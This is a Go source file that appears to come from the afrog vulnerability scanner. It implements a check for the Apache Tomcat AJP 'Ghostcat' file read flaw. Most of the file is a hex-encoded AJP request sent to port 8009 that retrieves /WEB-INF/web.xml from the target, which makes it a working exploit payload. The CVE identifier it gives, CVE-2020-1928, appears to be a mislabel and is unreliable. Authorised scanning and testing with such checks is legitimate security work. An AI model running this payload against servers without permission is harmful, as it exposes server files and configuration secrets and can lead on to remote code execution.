package gopoc

import (
	"bytes"
	"errors"

	"github.com/zan8in/afrog/pkg/poc"
	"github.com/zan8in/afrog/pkg/proto"
	"github.com/zan8in/afrog/pkg/utils"
)

var (
	tomcatAjpPort       = "8009"
	tomcatAjpUnAuthName = "CVE-2020-1928"
)

func tomcatAjpUnAuth(args *GoPocArgs) (Result, error) {
	poc := poc.Poc{
		Id: tomcatAjpUnAuthName,
		Info: poc.Info{
			Name:        "Apache Tomcat AJP 文件读取与包含漏洞",
			Author:      "zan8in",
			Severity:    "high",
			Description: "Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。",
			Reference: []string{
				"https://blog.csdn.net/qq_44159028/article/details/112507136",
			},
		},
	}
	args.SetPocInfo(poc)
	result := Result{Gpa: args, IsVul: false}

	if len(args.Host) == 0 {
		return result, errors.New("no host")
	}

	addr := args.Host + ":" + tomcatAjpPort
	payload := []byte("1234020e02020008485454502f312e310000132f6578616d706c65732f78787878782e6a73700000093132372e302e302e3100ffff00093132372e302e302e31000050000009a006000a6b6565702d616c69766500000f4163636570742d4c616e677561676500000e656e2d55532c656e3b713d302e3500a00800013000000f4163636570742d456e636f64696e67000013677a69702c206465666c6174652c207364636800000d43616368652d436f6e74726f6c0000096d61782d6167653d3000a00e00444d6f7a696c6c612f352e3020285831313b204c696e7578207838365f36343b2072763a34362e3029204765636b6f2f32303130303130312046697265666f782f34362e30000019557067726164652d496e7365637572652d52657175657374730000013100a001004a746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c696d6167652f776562702c2a2f2a3b713d302e3800a00b00093132372e302e302e31000a00216a617661782e736572766c65742e696e636c7564652e726571756573745f7572690000012f000a001f6a617661782e736572766c65742e696e636c7564652e706174685f696e666f0000102f5745422d494e462f7765622e786d6c000a00226a617661782e736572766c65742e696e636c7564652e736572766c65745f706174680000012f00ff")

	resp, err := utils.Tcp(addr, utils.HexDecode(string(payload)))
	if err != nil {
		return result, err
	}

	if bytes.Contains(resp, []byte("Licensed to the Apache Software Foundation")) {
		result.IsVul = true
		url := proto.UrlType{Host: addr, Port: tomcatAjpPort}
		result.SetAllPocResult(true, &url, utils.HexDecode(string(payload)), resp)
		return result, nil
	}

	return result, errors.New("check result: no vul")
}

func init() {
	GoPocRegister(tomcatAjpUnAuthName, tomcatAjpUnAuth)
}
